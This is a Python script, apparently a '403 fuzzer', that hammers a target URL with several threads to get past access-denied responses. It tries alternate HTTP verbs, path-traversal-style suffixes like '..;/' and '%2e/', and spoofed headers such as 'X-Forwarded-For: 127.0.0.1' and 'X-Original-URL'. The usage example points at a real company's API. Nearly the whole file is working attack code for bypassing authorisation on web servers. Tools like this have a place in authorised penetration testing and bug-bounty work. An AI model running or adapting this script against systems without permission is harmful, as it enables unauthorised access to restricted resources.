import requests
import sys
import threading
from queue import Queue

#configuring silliness
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    # X-HackerOne-Research: <lstarry>
}

#HTTP stuff to try
verbs = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']

bypassHeaders = [
    {"X-Original-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"}, #being weird and using american spellings bc everything is made for america for a gross reason
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Rewrite-URL": "/"},
    {"Referer": "https://www.google.com"}
]

#path suffixes to try
pathSuffixes = ["/", "%2e/", "..;/", "./", ".json"]

printLock = threading.Lock() #AGAIN so print statements are crashing into each other
taskQueue = Queue()

#we force the intern to perform all tests on a single URL
def intern():
    while not taskQueue.empty():
        url = taskQueue.get()

        try:
            #test HTTP verbs
            for verb in verbs:
                request = requests.request(verb, url, headers=headers, timeout = 5)
                if request.status_code != 403:
                    with printLock:
                        print(f"[*] Verb bypass (YAY): {verb:<8} {url} (Status: {request.status_code}, Size: {len(request.content)})")

            #test path suffixes
            for suffix in pathSuffixes:
                bypassedUrl = f"{url}{suffix}"
                request = requests.get(bypassedUrl, headers=headers, timeout = 5)
                if request.status_code != 403:
                    with printLock:
                        print(f"[*] Path bypass (WOAH): {bypassedUrl} (Status: {request.status_code}, Size: {len(request.content)})")

            #testing the *custom* headers :P
            for headerPayload in bypassHeaders:
                combinedHeaders = {**headers, **headerPayload}
                request = requests.get(url, headers=combinedHeaders, timeout = 5)
                if request.status_code != 403:
                    with printLock:
                        print(f"[*] Header bypass (ACHOO): {headerPayload} --> {url} (Status: {request.status_code}, Size: {len(request.content)})")

        except requests.exceptions.RequestException:
            pass #ignore connection errors AGAIN
        finally:
            taskQueue.task_done()

def main():
    if len(sys.argv) != 2:
        print("Example Usage: python3 403Fuzzer.py https://api.tesla.com")
        sys.exit(1)

    targetUrl = sys.argv[1].rstrip('/')
    print(f"[*] Starting to shake {targetUrl} around. Let's see if we can shake it enough that it actually hits anything useful.")

    taskQueue.put(targetUrl)

    numberOfThreads = 5
    for _ in range(numberOfThreads):
        thread = threading.Thread(target = intern)
        thread.daemon = True
        thread.start()

    taskQueue.join()
    print("[*] Shaking around COMPLETE!")

if __name__ == "__main__":
    main()